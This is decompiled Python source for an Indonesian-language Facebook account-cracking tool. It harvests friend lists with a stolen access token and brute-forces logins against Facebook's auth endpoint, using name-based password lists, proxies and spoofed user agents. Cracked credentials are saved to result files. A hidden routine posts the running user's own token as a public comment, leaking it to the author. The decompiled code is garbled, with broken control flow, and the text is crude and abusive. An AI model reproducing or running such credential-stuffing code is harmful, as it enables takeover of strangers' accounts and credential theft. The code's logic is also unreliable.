# Source Generated with Decompyle++
# File: bexm.pyc (Python 3.10)

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz

try:
    import requests
finally:
    pass

None if ImportError else None if ImportError else pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write('data/prox_socks5.txt', 'w')
finally:
    pass
if Exception:
    e = None
    
    try:
        print('')
    finally:
        e = None
        del e
    e = None
    del e
    prox = open('.prox.txt', 'r').read().splitlines()
    for xd in range(10000):
        a = 'Mozilla/5.0 (Symbian/3; Series60/'
        b = random.randrange(1, 9)
        c = random.randrange(1, 9)
        d = 'Nokia'
        e = random.randrange(100, 9999)
        f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g = random.randrange(1, 9)
        h = random.randrange(1, 4)
        i = random.randrange(1, 4)
        j = random.randrange(1, 4)
        k = 'Mobile Safari/535.1'
        uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
        ugen2.append(uaku)
        aa = 'Mozilla/5.0 (Linux; U; Android'
        b = random.choice([
            '6',
            '7',
            '8',
            '9',
            '10',
            '11',
            '12'])
        c = ' en-us; GT-'
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.randrange(1, 999)
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h = random.randrange(73, 100)
        i = '0'
        j = random.randrange(4200, 4900)
        k = random.randrange(40, 150)
        l = 'Mobile Safari/537.36'
        uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
        ugen.append(uaku2)
        for x in range(10):
            a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
            b = random.randrange(100, 9999)
            c = random.randrange(100, 9999)
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            h = random.randrange(1, 9)
            i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
            j = random.randrange(1, 9)
            k = random.randrange(1, 9)
            l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
            uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
            
            def uaku():
                
                try:
                    ua = open('bbnew.txt', 'r').read().splitlines()
                    for ub in ua:
                        ugen.append(ub)
                finally:
                    return None
                    a = requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
                    ua = open('.bbnew.txt', 'w')
                    aa = re.findall('line">(.*?)<', str(a))
                    for un in aa:
                        ua.write(un + '\n')
                    ua = open('.bbnew.txt', 'r').read().splitlines()
                    return None


            
            def hamz_bot():
                
                try:
                    token = open('login.txt', 'r').read()
                finally:
                    pass

                kom = None if IOError else ' Bang @[100006414900732:] Ganteng Bangetz Ngga Ada Obat \x1a\x1a\x1a\x1a'
                requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + token)
                requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + token)
                requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' + token + '&access_token=' + token)
                requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' + kom + '&access_token=' + token)
                menu()

            print('──────────────────────────────────────\n\x1b[1;97m    _          _\n\x1b[1;97m     \\        /\n\x1b[1;97m    __\\______/__\n\x1b[1;97m    | [\x1b[1;93m©\x1b[1;97m]  [\x1b[1;93m©\x1b[1;97m] |​\n\x1b[1;97m    |  [====]  | \n \x1b[1;93m╔═\x1b[1;97mo00\x1b[1;93m════════\x1b[1;97m00o\x1b[1;93m═╗ ╔═╗┬ ┬┌─┐┌┐┌┌─┐\n █    CRACKING    █ ║  ├─┤├─┤││││ ┬\n \x1b[1;93m╚════════════════╝ ╚═╝┴ ┴┴ ┴┘└┘└─┘\n──────────────────────────────────────\n\x1b[m[\x1b[32m✓\x1b[m] BAGIKAN DI GRUP FACEBOOK ADMIN \n\x1b[m[\x1b[32m✓\x1b[m]\x1b[1;96m INFORMASI SCRIPT HUBUNGI ADMIN \x1b[32mChangFB\x1b[0;34m')
            os.system('xdg-open https://www.facebook.com/groups/544745423962902/?ref=share')
            (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
            cokbrut = []
            pwpluss = []
            pwnya = []
            P = '\x1b[1;97m'
            M = '\x1b[1;91m'
            H = '\x1b[1;92m'
            K = '\x1b[1;93m'
            B = '\x1b[1;94m'
            U = '\x1b[1;95m'
            O = '\x1b[1;96m'
            N = '\x1b[0m'
            Z = '\x1b[1;30m'
            sir = '\x1b[41m\x1b[1;97m'
            x = '\x1b[m'
            m = '\x1b[1;91m'
            k = '\x1b[93m'
            h = '\x1b[1;92m'
            hh = '\x1b[32m'
            u = '\x1b[95m'
            kk = '\x1b[33m'
            b = '\x1b[1;96m'
            p = '\x1b[0;34m'
            asu = random.choice([
                m,
                k,
                h,
                u,
                b])
            dic = {
                '1': 'January',
                '2': 'February',
                '3': 'March',
                '4': 'April',
                '5': 'May',
                '6': 'June',
                '7': 'July',
                '8': 'August',
                '9': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'December' }
            dic2 = {
                '01': 'January',
                '02': 'February',
                '03': 'March',
                '04': 'April',
                '05': 'May',
                '06': 'June',
                '07': 'July',
                '08': 'August',
                '09': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'Devember' }
            tgl = datetime.datetime.now().day
            bln = dic[str(datetime.datetime.now().month)]
            thn = datetime.datetime.now().year
            okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            
            def jalan(z):
                for e in z + '\n':
                    sys.stdout.write(e)
                    sys.stdout.flush()
                    time.sleep(0.03)

            
            def alvino_xy(u):
                for e in u + '\n':
                    sys.stdout.write(e)
                    sys.stdout.flush()
                    time.sleep(0.05)

            
            def clear():
                os.system('clear')

            
            def back():
                login()

            
            def banner():
                print(f'''\t{asu}                                          \n \x1b[33m╔═╗┬ ┬┌─┐┌┐┌┌─┐  ┌─┐┬ ┬┌┬┐┌─┐┬─┐┌─┐\n \x1b[33m║  ├─┤├─┤││││ ┬  │  │ │ │ ├┤ ├┬┘└─┐\n \x1b[33m╚═╝┴ ┴┴ ┴┘└┘└─┘  └─┘└─┘ ┴ └─┘┴└─└─┘\n {N}[{h}Whatsapp : {asu}0819-0776-1235{N}][{h}GratisCil{N}]\n{N}──────────────────────────────────────{p}''')

            
            def login():
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                    tokenku.append(token)
                    
                    try:
                        sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], {
                            'cookie': cok }, **('cookies',))
                        sy2 = json.loads(sy.text)['name']
                        sy3 = json.loads(sy.text)['id']
                        menu(sy2, sy3)
                    finally:
                        return None
                        if KeyError:
                            login_lagi334()
                        return None
                        if requests.exceptions.ConnectionError:
                            li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
                            lo = mark(li, 'red', **('style',))
                            sol().print(lo, 'cyan', **('style',))
                            exit()
                        return None
                        if IOError:
                            login_lagi334()
                            return None



            
            def login_lagi334():
                
                try:
                    os.system('clear')
                    banner()
                    asu = random.choice([
                        m,
                        k,
                        h,
                        b,
                        u])
                    cookie = input(f'''  {x}[{h}•{x}] Masukkan Cookies :{asu} ''')
                    data = requests.get('https://business.facebook.com/business_locations', {
                        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
                        'referer': 'https://www.facebook.com/',
                        'host': 'business.facebook.com',
                        'origin': 'https://business.facebook.com',
                        'upgrade-insecure-requests': '1',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'cache-control': 'max-age=0',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8',
                        'content-type': 'text/html; charset=utf-8' }, {
                        'cookie': cookie }, **('headers', 'cookies'))
                    find_token = re.search('(EAAG\\w+)', data.text)
                    ken = open('.token.txt', 'w').write(find_token.group(1))
                    bot()
                    cok = open('.cok.txt', 'w').write(cookie)
                    print(f'''  {x}[{h}•{x}]{h} BERHASIL..Jalankan Lagi {asu}python ChangFB{x} ''')
                    time.sleep(1)
                    exit()
                finally:
                    return None
                    if Exception:
                        e = None
                        
                        try:
                            os.system('rm -f .token.txt')
                            os.system('rm -f .cok.txt')
                            print('  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s' % (x, k, x, m, x))
                            exit()
                        finally:
                            e = None
                            del e
                            return None
                            e = None
                            del e



            
            def bot():
                
                try:
                    requests.post('https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s' % tokenku)
                finally:
                    return None
                    return None


            
            def menu(my_name, my_id):
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                finally:
                    pass

                None if IOError else os.system('clear')
                banner()
                jalan('➤ 1. Crack Facebook ')
                jalan('➤ 2. Hasil Crack  ')
                jalan('➤ 0. Keluar       ')
                _____Chang__FB_____ = input('\n➤ Pilih : ')
                if _____Chang__FB_____ in ('1',):
                    dump_massal()
                    return None
                if None in ('33',):
                    grup()
                    return None
                if None in ('2',):
                    result()
                    return None
                if None in ('0',):
                    os.system('rm -rf .token.txt')
                    os.system('rm -rf .cookie.txt')
                    print('➤ Sukses Logout+Hapus Kukis ')
                    exit()
                    return None
                None('➤ Pilih Yang Bener Asu ')
                back()

            
            def error():
                jalan(f'''{k}➤ Anda Akan di arahkan ke Facebook''')
                time.sleep(4)
                back()

            
            def dump_massal():
                
                try:
                    token = open('.token.txt', 'r').read()
                finally:
                    pass

                None if IOError else None if IOError else print('\x1b[m➤ Ketik \x1b[1;96mMe\x1b[m Jika Ingin Dump Dari Teman Sendiri')
                pil = input('\x1b[m➤ Masukkan Target : ')
                
                try:
                    koh2 = requests.get('https://graph.facebook.com/v2.0/' + pil + '?fields=friends.limit(5000)&access_token=' + tokenku[0], {
                        'cookie': cok }, **('cookies',)).json()
                    for pi in koh2['friends']['data']:
                        
                        try:
                            id.append(pi['id'] + '|' + pi['name'])
                        finally:
                            continue
                            continue
                            print(f'''\x1b[m➤ Total :{h} ''' + str(len(id)))
                            setting()
                            return None
                            if requests.exceptions.ConnectionError:
                                print('|\x1b[m➤ Sinyal Musha ')
                                back()
                                return None
                            if (KeyError, IOError):
                                print('\x1b[m➤ Pertemanan Tidak Public ')
                                back()
                                return None



            
            def result():
                print(f'''\x1b[m➤ 1. Hasil {h}OK{x} Anda ''')
                print(f'''➤ 2. Hasil {k}CP{x} Anda ''')
                print('➤ 3. Kembali\t')
                kz = input('\n➤ Pilih : ')
                if kz in ('2',):
                    
                    try:
                        vin = os.listdir('CP')
                    finally:
                        pass

                    if None if FileNotFoundError else len(vin) == 0:
                        print('➤ Anda Tidak Memiliki Hasil CP ')
                        time.sleep(2)
                        back()
                        return None
                    cih = None
                    lol = { }
                    for isi in vin:
                        
                        try:
                            hem = open('CP/' + isi, 'r').readlines()
                        finally:
                            pass
                        continue
                        cih += 1
                        if cih < 10:
                            nom = '' + str(cih)
                            lol.update({
                                str(cih): str(isi) })
                            lol.update({
                                nom: str(isi) })
                            print(f'''➤ %s. %s ({k} %s {x}Idz )''' % (nom, isi, len(hem)))
                            continue

                        lol.update({
                            str(cih): str(isi) })
                        print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                        geeh = input('\n➤ Pilih : ')
                        
                        try:
                            geh = lol[geeh]
                        finally:
                            pass
                        if KeyError:
                            print('➤ Pilih Yang Bener Kontol ')
                            back()
                        else:
                            
                            try:
                                lin = open('CP/' + geh, 'r').read().splitlines()
                            finally:
                                pass
                            print('➤ File Tidak Di Temukan ')
                            time.sleep(2)
                            back()
                            nocp = 0
                            for cpku in range(len(lin)):
                                cpkuni = lin[nocp].split('|')
                                print(f'''➤ {k}{cpkuni[0]}|{cpkuni[1]}''')
                                nocp += 1
                                print('')
                                input(f'''➤[{m} Klik Enter{x} ]''')
                                back()
                                return None
                                if kz in ('1',):
                                    
                                    try:
                                        vin = os.listdir('OK')
                                    finally:
                                        pass

                                    if None if FileNotFoundError else len(vin) == 0:
                                        print('➤ Anda Tidak Mempunyai File OK ')
                                        time.sleep(2)
                                        back()
                                        return None
                                    cih = None
                                    lol = { }
                                    for isi in vin:
                                        
                                        try:
                                            hem = open('OK/' + isi, 'r').readlines()
                                        finally:
                                            pass
                                        continue
                                        cih += 1
                                        if cih < 10:
                                            nom = '0' + str(cih)
                                            lol.update({
                                                str(cih): str(isi) })
                                            lol.update({
                                                nom: str(isi) })
                                            print(f'''➤%s. %s ( {h}%s{x} Idz )''' % (nom, isi, len(hem)))
                                            continue

                                        lol.update({
                                            str(cih): str(isi) })
                                        print(f'''➤ %s. %s ({h} %s {x}Idz )''' % (cih, isi, len(hem)))
                                        geeh = input('\nPilih : ')
                                        
                                        try:
                                            geh = lol[geeh]
                                        finally:
                                            pass
                                        if KeyError:
                                            print('➤ Pilih Yang Bener Kontol ')
                                            back()
                                        else:
                                            
                                            try:
                                                lin = open('OK/' + geh, 'r').read().splitlines()
                                            finally:
                                                pass
                                            print('➤ File Tidak Di Temukan ')
                                            time.sleep(2)
                                            back()
                                            nocp = 0
                                            for cpku in range(len(lin)):
                                                cpkuni = lin[nocp].split('|')
                                                print('')
                                                print(f'''➤{h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}''')
                                                nocp += 1
                                                print('')
                                                input(f'''➤[{m} Klik Enter{x} ]''')
                                                back()
                                                return None
                                                if kz in ('3',):
                                                    back()
                                                    return None
                                                None('➤ Pilih Yang Bener Kontol ')
                                                back()
                                                return None





            
            def dump_massal1():
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                finally:
                    pass

                if None if IOError else None if ValueError else jum < 1 or jum > 100:
                    print('➤ Gagal Dump Id ')
                    exit()
                ses = requests.Session()
                yz = 0
                for met in range(jum):
                    yz += 1
                    kl = input('➤ Masukkan ID Yang Ke ' + str(yz) + ' : ')
                    uid.append(kl)
                    for userr in uid:
                        
                        try:
                            col = ses.get('https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0], {
                                'cookies': cok }, **('cookies',)).json()
                            for mi in col['friends']['data']:
                                
                                try:
                                    iso = mi['id'] + '|' + mi['name']
                                    if iso in id:
                                        pass
                                    else:
                                        id.append(iso)
                                finally:
                                    continue
                                    continue
                                    continue
                                    if (KeyError, IOError):
                                        continue
                                    if requests.exceptions.ConnectionError:
                                        print('➤ Sinyal Loh Kek Kontoll ')
                                        exit()
                                        continue
                                        
                                        try:
                                            print(f'''➤ Total ID Yang Terkumpul {h}''' + str(len(id)))
                                            setting()
                                        finally:
                                            return None
                                            if requests.exceptions.ConnectionError:
                                                print(f'''{x}''')
                                                print('➤ Sinyal Lo kek Kontol ')
                                                back()
                                                return None
                                            if (KeyError, IOError):
                                                print(f'''➤{k} Pertemanan Tidak Public {x}''')
                                                time.sleep(3)
                                                back()
                                                return None




            
            def setting():
                print(f'''{N}──────────────────────────────────────''')
                hu = input('\x1b[m➤ \x1b[1;91mMau Crack Atau Tidak \x1b[0;34mT\x1b[m/\x1b[32mY\x1b[m ')
                if hu in ('Tua', '01'):
                    for tua in sorted(id):
                        id2.append(tua)
                elif hu in ('New', '02'):
                    muda = []
                    for bacot in sorted(id):
                        muda.append(bacot)
                    bcm = len(muda)
                    bcmi = bcm - 1
                    for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -= 1
                elif hu in ('m', 'M'):
                    for bacot in id:
                        xx = random.randint(0, len(id2))
                        id2.insert(xx, bacot)
                else:
                    print('➤ Pilih Yang Bener Kontooll ')
                    exit()
                print(f'''➤ 1. {h}Crack {m}√{N}''')
                print(f'''➤ 2. {h}Cracker {m}√{N}''')
                print(f'''➤ 3. {h}Cracking {m}√{N}''')
                hc = input('➤ Pilih : ')
                if hc in ('1', '01'):
                    method.append('mobile')
                elif hc in ('2', '01'):
                    method.append('api')
                elif hc in ('3', '03'):
                    method.append('free')
                else:
                    method.append('mobile')
                    print('➤ Pilih Yang Bener Kontol ')
                pwplus = input('\x1b[m➤\x1b[1;91m Tambahkan Password Manual \x1b[0;34mT\x1b[m/\x1b[32mY\x1b[m ')
                if pwplus in ('y', 'Y'):
                    pwpluss.append('ya')
                    cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
                    pwku = input('➤ Masukkan Password Tambahan : ')
                    pwkuh = pwku.split(',')
                    for xpw in pwkuh:
                        pwnya.append(xpw)
                else:
                    pwpluss.append('no')
                passwrd()

            
            def passwrd():
                jalan(f'''{N}──────────────────────────────────────\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDasar Luh Kebanyakan Bacot\n\x1b[1;91mDasar Bocil Ngaku² Hacker\n\x1b[93mTermux Bukan Untuk Hacker\n\x1b[1;92mJangan Ngaku² Hacker\n\x1b[95mBocil² Bangsat Tai Baru Bisa Install Script Udah Bangga\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \x1b[1;92m╔═╗┬ ┬┌─┐┌┐┌┌─┐  ┌─┐┬ ┬┌┬┐┌─┐┬─┐┌─┐\n \x1b[1;92m║  ├─┤├─┤││││ ┬  │  │ │ │ ├┤ ├┬┘└─┐\n \x1b[1;92m╚═╝┴ ┴┴ ┴┘└┘└─┘  └─┘└─┘ ┴ └─┘┴└─└─┘\n \x1b[m──────────────────────────────────────\x1b[m\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\x1b[1;97m    _          _\n\x1b[1;97m     \\        /\n\x1b[1;97m    __\\______/__\n\x1b[1;97m    | [\x1b[1;93m©\x1b[1;97m]  [\x1b[1;93m©\x1b[1;97m] |​\n\x1b[1;97m    |  [====]  | \n \x1b[1;93m╔═\x1b[1;97mo00\x1b[1;93m════════\x1b[1;97m00o\x1b[1;93m═╗ {h}╔═╗┬ ┬┌─┐┌┐┌┌─┐\n {asu}█    CRACKING    █ {h}║  ├─┤├─┤││││ ┬\n \x1b[1;93m╚════════════════╝{h} ╚═╝┴ ┴┴ ┴┘└┘└─┘\n{N}──────────────────────────────────────\n➤  {h}OK/%s {x}''' % okc)
                jalan(f'''➤  {p}CP/%s {x}''' % cpc)
                jalan('──────────────────────────────────────')
                with tred(30, **('max_workers',)) as pool:
                    for yuzong in id2:
                        idf = yuzong.split('|')[0]
                        nmf = yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        pwv = [
                            'sayang',
                            'sayangku',
                            'sayang123',
                            'bismillah',
                            'anjing',
                            'katasandi',
                            'sandi123,malang,bismillah123,bismillah,123455']
                        if len(nmf) < 6:
                            if len(frs) < 3:
                                pass
                            else:
                                pwv.append(frs + 'Sayang')
                                pwv.append(frs + 'Bangsat')
                                pwv.append(frs + 'Kontol')
                                pwv.append(frs + 'Anjing')
                                pwv.append(frs + 'bismillah')
                                pwv.append(frs + 'cintaku')
                                pwv.append(frs + '123456')
                        elif len(frs) < 3:
                            pwv.append(nmf)
                        else:
                            pwv.append(nmf)
                            pwv.append(frs + '123')
                            pwv.append(frs + '321')
                            pwv.append(frs + '1234')
                            pwv.append(frs + '12345')
                        if 'ya' in pwpluss:
                            for xpwd in pwnya:
                                pwv.append(xpwd)
                        
                        if 'mobile' in method:
                            pool.submit(crack, idf, pwv)
                            continue
                        if 'api' in method:
                            pool.submit(api, idf, pwv)
                            continue
                        if 'free' in method:
                            pool.submit(free, idf, pwv)
                            continue
                        if 'mbasic' in method:
                            pool.submit(crackmbasic, idf, pwv)
                            continue
                        pool.submit(crackmbasic, idf, pwv)
                    None(None, None, None)
                if not None:
                    pass
                print('')
                print(f'''➤[{b}•➤]{h} OK : {h}%s{x}''' % ok)
                print(f'''➤[{b}•➤]{k} CP : {k}%s{x} ''' % cp)
                print('')
                print('➤ Lanjut Crack Kembali ( Y/t ) ? ')
                woi = input('➤ Pilih : ')
                if woi in ('y', 'Y'):
                    back()
                    return None
                None(f'''\t➤{k} The Changcuters ''')
                time.sleep(2)
                exit()

            
            def crack(idf, pwv):
                global cp, ok, loop
                bi = random.choice([
                    u,
                    k,
                    kk,
                    b,
                    h,
                    hh])
                pers = loop * 100 / len(id2)
                fff = '%'
                print('\r  🔓%s[%s/%s]-[%s]-[%s]-[%s%s]%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
                sys.stdout.flush()
                ua = random.choice(ugen).replace('\n', '')
                (sys.stdout.write(f'''\r  🔒{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{p}{cp}{x}]—[{m}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
                sys.stdout.flush()
                ua = 'Mozilla/5.0 (Linux; Android 10; S40Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
                ua2 = 'Mozilla/5.0 (Linux; Android 10; S40Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
                ses = requests.Session()
                for pw in pwv:
                    
                    try:
                        head = {
                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                            'x-fb-connection-quality': 'EXCELLENT',
                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                            'user-agent': ua,
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-fb-http-engine': 'Liger' }
                        resp = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(idf) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', head, **('headers',))
                        if 'www.facebook.com' in resp.json()['error_msg']:
                            if 'ya' in oprek:
                                akun.append(idf + '|' + pw)
                                ceker(idf, pw)
                            else:
                                print('\r%s╰───%s | %s        ' % (p, idf, pw))
                                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                                akun.append(idf + '|' + pw)
                                cp += 1
                        elif 'session_key' in resp.text and 'EAAA' in resp.text:
                            print('\r%s╰───%s | %s        ' % (h, idf, pw))
                            open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                            ok += 1
                    finally:
                        pass
                    continue
                    if requests.exceptions.ConnectionError:
                        time.sleep(31)
                        continue

                    loop += 1
                    return None

            
            def api(idf, pwv):
                global cp, ok, loop
                bi = random.choice([
                    u,
                    k,
                    kk,
                    b,
                    h,
                    hh])
                pers = loop * 100 / len(id2)
                fff = '%'
                print('\r  🤩%s[%s/%s]-[%s]-[%s]-[%s%s]%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
                sys.stdout.flush()
                ua = random.choice(ugen).replace('\n', '')
                (sys.stdout.write(f'''\r  😍{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{p}{cp}{x}]—[{m}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
                for pw in pwv:
                    
                    try:
                        head = {
                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                            'x-fb-connection-quality': 'EXCELLENT',
                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                            'user-agent': ua,
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-fb-http-engine': 'Liger' }
                        resp = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(idf) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', head, **('headers',))
                        if 'www.facebook.com' in resp.json()['error_msg']:
                            if 'ya' in oprek:
                                akun.append(idf + '|' + pw)
                                ceker(idf, pw)
                            else:
                                print('\r%s    %s | %s        ' % (p, idf, pw))
                                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                                akun.append(idf + '|' + pw)
                                cp += 1
                        elif 'session_key' in resp.text and 'EAAA' in resp.text:
                            print('\r%s    %s | %s        ' % (h, idf, pw))
                            open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                            ok += 1
                    finally:
                        pass
                    continue
                    if requests.exceptions.ConnectionError:
                        time.sleep(31)
                        continue

                    loop += 1
                    return None

            
            def free(idf, pwv):
                global cp, ok, loop
                bi = random.choice([
                    u,
                    k,
                    kk,
                    b,
                    h,
                    hh])
                pers = loop * 100 / len(id2)
                fff = '%'
                print('\r  😝%s[%s/%s]-[%s]-[%s]-[%s%s]%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
                sys.stdout.flush()
